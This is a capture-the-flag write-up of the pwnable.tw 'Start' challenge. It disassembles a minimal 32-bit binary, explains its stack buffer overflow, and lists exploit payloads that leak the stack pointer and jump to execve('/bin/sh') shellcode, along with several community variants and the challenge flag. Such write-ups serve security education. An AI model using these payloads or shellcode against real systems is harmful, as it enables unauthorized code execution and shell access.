---
tags:
  - stack-buffer-overflow
  - information-leak
  - shellcode
platform: pwnable.tw
points: 100
arch: i386
libc: static
relro: no
canary: no
nx: no
pie: no
references:
  - https://pwnable.tw/challenge/
description: "A stack buffer overflow in a minimal 32-bit assembly binary is used to leak the stack pointer via sys_write and return to user shellcode on the stack."
proof-of-concept: no
---

# Start — pwnable.tw (100 pts)

[← Back to pwnable.tw Challenge Index](README.md)

> `nc chall.pwnable.tw 10000`
>
> Flag: `FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}`

## Challenge Overview

A tiny hand-written x86-32 assembly program (67 bytes of `.text`). It prints `"Let's start the CTF:"`, reads up to 60 bytes from stdin into a 20-byte stack buffer, then returns. No libc, no protections — pure raw syscalls on a statically linked, non-stripped ELF.

```
checksec:
  Arch:     i386-32-little
  RELRO:    No RELRO
  Stack:    No canary found
  NX:       NX disabled          # stack is RWX
  PIE:      No PIE
```

## Disassembly

The entire binary is just two routines:

```asm
08048060 <_start>:
 8048060:  push   esp                    ; save original ESP on stack
 8048061:  push   0x804809d              ; push address of _exit (return addr)
 8048066:  xor    eax,eax                ; clear registers
 8048068:  xor    ebx,ebx
 804806a:  xor    ecx,ecx
 804806c:  xor    edx,edx
 804806e:  push   0x3a465443             ; push "CTF:" (5 pushes = 20 bytes)
 8048073:  push   0x20656874             ; push "the "
 8048078:  push   0x20747261             ; push "art "
 804807d:  push   0x74732073             ; push "s st"
 8048082:  push   0x2774654c             ; push "Let'"
 8048087:  mov    ecx,esp                ; ecx = buffer addr (ESP)
 8048089:  mov    dl,0x14                ; edx = 20 (count)
 804808b:  mov    bl,0x1                 ; ebx = 1 (stdout)
 804808d:  mov    al,0x4                 ; eax = 4 (sys_write)
 804808f:  int    0x80                   ; write(1, esp, 20) → prints message
 8048091:  xor    ebx,ebx               ; ebx = 0 (stdin)
 8048093:  mov    dl,0x3c                ; edx = 60 (count)
 8048095:  mov    al,0x3                 ; eax = 3 (sys_read)
 8048097:  int    0x80                   ; read(0, esp, 60) ← VULN: 60 > 20
 8048099:  add    esp,0x14               ; pop the 20-byte message buffer
 804809c:  ret                           ; return to [esp] (was _exit, now attacker-controlled)

0804809d <_exit>:
 804809d:  pop    esp                    ; restore original ESP
 804809e:  xor    eax,eax
 80480a0:  inc    eax                    ; eax = 1 (sys_exit)
 80480a1:  int    0x80                   ; exit(0)
```

### Stack Layout at `read` (0x8048097)

```
         ESP →  [ "Let'" ]           ← message[0:4]   (overwritten by input)
         +0x04  [ "s st" ]           ← message[4:8]
         +0x08  [ "art " ]           ← message[8:12]
         +0x0c  [ "the " ]           ← message[12:16]
         +0x10  [ "CTF:" ]           ← message[16:20]
         +0x14  [ 0x0804809d ]       ← saved return addr (_exit) ← OVERWRITE TARGET
         +0x18  [ original ESP ]     ← pushed by `push esp` at 0x8048060
         +0x1c  [ argc ]             ← original stack from kernel
         ...    (more argv/envp)     ← up to 60-20=40 bytes past ret addr
```

## Vulnerability

### V1 — Stack Buffer Overflow (20 bytes buffer, 60 bytes read)

**Root Cause:** `read(0, esp, 60)` reads 60 bytes into a region where only 20 bytes are allocated for the message. The remaining 40 bytes overflow past the message into the **saved return address** and beyond.

```asm
8048093:  mov    dl,0x3c         ; read up to 60 bytes
8048095:  mov    al,0x3          ; sys_read
8048097:  int    0x80            ; read(stdin, esp, 60)
8048099:  add    esp,0x14        ; skip 20-byte message
804809c:  ret                    ; return to whatever is now at [esp]
```

**Attacker controls:** bytes 20-23 overwrite the return address. Bytes 24-59 land on the stack after the return address.

**Enabling conditions:**
- **NX disabled** → stack is executable, shellcode runs directly
- **ASLR enabled** → stack addresses are randomized, need a leak
- **No canary** → return address overwrite is trivial
- **`push esp` at program start** → the original ESP value is stored on the stack at offset `+0x18`, just 4 bytes after the return address

## Exploit Paths

All 339 solutions use essentially the same two-stage approach. Variations are minor (different return gadget, shellcode flavor, NOP sled size).

---

### Path A — Return to `0x8048087` → Leak Stack → Shellcode (Standard)

**Used by:** ~95% of all solutions (e.g., 100, 114, 1045, 1172, 1220, 1251, 1269, 1297, 1335, 10068, 10115, 10295, 10302, 11543, 12138, 12649, 13367, 13484, 14370, 15989, exp.py)

This is the canonical solution. Two interactions with the server:

**Stage 1 — Leak the stack address:**

```python
payload1 = b"A" * 20 + p32(0x08048087)
```

Overwrite the return address with `0x08048087` (`mov ecx, esp`). When `ret` executes at `0x804809c`:
1. `add esp, 0x14` pops the 20-byte message → ESP now points to the overwritten return address slot.
2. `ret` jumps to `0x08048087`.
3. At `0x08048087`: `mov ecx, esp` → ECX = current ESP.
4. `write(1, esp, 20)` prints 20 bytes from the stack. The **first 4 bytes** are the **original ESP** value (pushed by `push esp` at `0x8048060`).
5. `read(0, esp, 60)` gives us a second input opportunity.

```python
leaked_esp = u32(recv(4))  # original ESP from the stack
```

**Stage 2 — Jump to shellcode:**

```python
shellcode_addr = leaked_esp + 0x14  # shellcode lands 20 bytes after ESP
payload2 = b"A" * 20 + p32(shellcode_addr) + shellcode
```

The 20-byte padding fills the message buffer, `p32(shellcode_addr)` overwrites the return address, and the shellcode follows immediately after. When `ret` fires, execution jumps to the shellcode on the stack.

**Shellcode:** Almost universally `execve("/bin/sh", NULL, NULL)` — typically 21-28 bytes, many variants exist:

```asm
; 24-byte execve("/bin/sh") — most common variant
xor    eax, eax
push   eax
push   0x68732f2f    ; "//sh"
push   0x6e69622f    ; "/bin"
mov    ebx, esp      ; ebx = "/bin//sh"
xor    ecx, ecx
mov    edx, ecx      ; ecx = edx = NULL
mov    al, 0xb       ; sys_execve
int    0x80
```

---

### Path B — Return to `0x0804808b` → Leak Stack (Shifted) → Shellcode-Before-Return

**Used by:** Solutions 138 (Ruby), 170

Returns to `0x804808b` instead of `0x8048087`. The difference: entering at `0x804808b` skips `mov ecx, esp` and `mov dl, 0x14`, so **ECX retains its prior value** (still points to the message area) and **BL is set to 1** but **DL keeps its old value** (0x14 from the previous write). This writes 20 bytes but from a different stack position — the leaked ESP value appears at a different offset in the output (byte 24 instead of byte 0).

```python
payload1 = b"a" * 20 + p32(0x0804808b)
# ... recv 24 bytes, then 4 bytes = leaked ESP
```

In stage 2, the shellcode is placed **before** the return address (in the 20-byte padding area), and the return address points backward:

```python
payload2 = shellcode.ljust(44, b"a") + p32(leaked_stack - 0x1c)
```

---

### Path C — Return to `0x08048060` (`_start`) → Re-run → Standard Leak

**Used by:** Solution 10128

A three-stage variant: first overflow returns to `_start` (0x8048060) to completely re-run the program. The second run then uses the standard Path A approach. This adds one round trip but the logic is conceptually cleaner.

```python
# Stage 1: restart the program
payload1 = cyclic(20) + p32(0x8048060)
# Stage 2: leak (same as Path A stage 1)
payload2 = cyclic(20) + p32(0x8048087)
# Stage 3: shellcode (same as Path A stage 2)
payload3 = cyclic(20) + p32(leaked_esp + 20) + shellcode
```

---

### Path D — NOP Sled Variants

**Used by:** Solutions 1220, 11540, 12138, 12649, 1236

Same two-stage approach as Path A, but use NOP sleds (`\x90`) before the shellcode to increase reliability:

```python
payload2 = b"\x90" * 20 + p32(leaked_esp + 20) + b"\x90" * N + shellcode
```

Some place the return address in multiple slots (e.g., `p32(addr) * 6`) to increase the chance of hitting the right offset.

---

### Path E — Shellcode Placement Variations

A few solutions place shellcode in the 20-byte padding area (before the return address) instead of after it:

```python
# Shellcode in padding, return address points to it
payload2 = shellcode.ljust(20, b"\x90") + p32(leaked_esp - offset)
```

This works when the shellcode is small enough (≤20 bytes) and requires calculating the correct backward offset from the leaked stack address.

## Exploit Primitive Summary

| Primitive | Source | Reliability |
|-----------|--------|-------------|
| Return address overwrite | V1: 60-byte read into 20-byte buffer | Deterministic |
| Stack address leak | Return to `0x8048087` (write gadget) | Deterministic |
| Shellcode execution | NX disabled, stack is RWX | Deterministic |
| `execve("/bin/sh")` | 21-28 byte inline shellcode | Deterministic |

## Key Addresses

```python
_start         = 0x08048060  # program entry
write_gadget   = 0x08048087  # mov ecx,esp; write(1,esp,20); read(0,esp,60)
write_no_ecx   = 0x0804808b  # mov bl,1; write(1,ecx,20); read(0,esp,60)
read_syscall   = 0x08048091  # xor ebx; read(0,esp,60)
add_esp_ret    = 0x08048099  # add esp,0x14; ret
_exit          = 0x0804809d  # pop esp; exit(1)
```

## Solution Write-ups

339 solutions exist, nearly all following Path A. Representative samples:

| File | Approach | Language | Notes |
|------|----------|----------|-------|
| `exp.py` | A | Python (raw sockets) | Reference exploit, no pwntools |
| `100.md` | A | Python (pwntools) | Minimal, clean |
| `114.md` | A | Python (pwntools) | Good prose explanation |
| `138.md` | B (Ruby) | Ruby | Returns to `0x804808b`; rare Ruby solution |
| `170.md` | B | Python (pwntools) | Returns to `0x804808b`, shellcode before ret addr |
| `1045.md` | A | Python (pwntools) | Uses `shellcraft.execve` |
| `1316.md` | A | Go | Only Go-language solution |
| `10128.md` | C | Python (pwntools) | Three-stage via `_start` re-entry |
| `10178.md` | E | Python (pwntools) | Shellcode before return address |
| `10295.md` | A | Python (pwntools) | Detailed stack diagram explanation |
| `11543.md` | A | Python (pwntools) | Korean; concise |
| `13889.md` | A | Python (raw sockets) | Most detailed writeup with annotated disassembly |
| `14370.md` | A | Python (raw sockets) | Good educational walkthrough |
| `15989.md` | A | Python (pwntools) | Clean and brief |

## Files

| File | Description |
|------|-------------|
| `exp.py` | Working exploit script (raw sockets, no pwntools) |
| `desc.txt` | Challenge description |
| `artifacts/start` | Original challenge binary (ELF 32-bit, statically linked) |
| `solution/*.md` | Community write-ups (339 solutions) |
